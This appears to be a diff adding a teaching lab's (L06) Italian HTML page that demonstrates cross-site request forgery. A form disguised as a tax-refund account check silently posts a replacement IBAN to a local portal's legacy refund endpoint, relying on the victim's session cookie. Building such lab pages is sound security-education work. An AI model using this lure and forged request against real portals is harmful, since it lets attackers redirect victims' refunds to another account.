@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="utf-8">
+    <title>Estratto conto</title>
+    <style>
+        body { font: 16px/1.6 system-ui, sans-serif; max-width: 34rem; margin: 3rem auto; padding: 0 1rem; }
+        label { display: block; margin-top: 1rem; font-weight: 600; }
+        input { width: 100%; padding: .6rem; margin-top: .3rem; box-sizing: border-box; }
+        button { margin-top: 1.2rem; padding: .7rem 1.2rem; background: #1a5fb4; color: #fff; border: 0; border-radius: 4px; font-size: 1rem; cursor: pointer; }
+        .nota { color: #666; font-size: .85rem; margin-top: 2rem; }
+    </style>
+</head>
+<body>
+<h1>Estratto conto</h1>
+<p>Verifica del conto per l'accredito del rimborso fiscale.</p>
+
+<!--
+    Pagina d'attacco (laboratorio L06).
+    Il form punta al modulo legacy del portale, quello che usa il cookie di sessione:
+    la richiesta parte dal browser della vittima e viaggia con le sue credenziali.
+    Con il portale aperto in un'altra scheda, basta premere il pulsante.
+-->
+<form method="POST" action="http://127.0.0.1:8081/sportello/rimborso/1/iban" id="modulo">
+    <label for="pratica">Pratica</label>
+    <input id="pratica" name="pratica" value="1" inputmode="numeric">
+
+    <label for="iban">IBAN di accredito</label>
+    <input id="iban" name="iban" value="IT60X0542811101000000123456">
+
+    <button type="submit">Conferma il conto</button>
+</form>
+
+<p class="nota">
+    Nel laboratorio l'indirizzo del modulo si cambia qui sopra nel sorgente della pagina.
+    Se il portale non ha una sessione aperta, la richiesta viene rifiutata: è il senso del
+    laboratorio, non un guasto.
+</p>
+</body>
+</html>
